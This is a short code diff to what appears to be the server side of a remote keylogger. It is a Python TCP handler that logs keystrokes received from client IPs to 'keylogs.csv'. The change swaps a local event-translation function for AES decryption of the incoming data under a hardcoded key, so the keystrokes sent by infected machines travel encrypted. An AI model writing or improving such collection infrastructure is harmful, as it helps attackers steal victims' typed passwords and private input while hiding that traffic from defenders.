@@ -7,6 +7,8 @@ from datetime import datetime
 
 import pandas as pd
 
+from Encryption import AESCipher
+
 
 def log_csv(ip_cli, ipt):
     filename = 'keylogs.csv'
@@ -23,15 +25,6 @@ def log_csv(ip_cli, ipt):
     finally:
         df.to_csv(filename)
 
-
-def translate_event(data):
-    (ev_type, ev_code, _) = tuple(data.split(',')[:-1])
-    if ev_type == ecodes.EV_KEY:
-        return f"{ecodes.EV_KEY[ev_code]}"
-    else:
-        return None
-
-
 class TCPHandler(BaseRequestHandler):
     def handle(self):
         client = self.request.getpeername()
@@ -44,8 +37,7 @@ class TCPHandler(BaseRequestHandler):
                 print(f'[+] {ip_cli} disconnected.')
                 log_csv(ip_cli, '[KO]')
                 return
-
-            data = translate_event(data)
+            data = AESCipher("jesuistropfraiche").decrypt(data)
             if not data:
                 continue
 
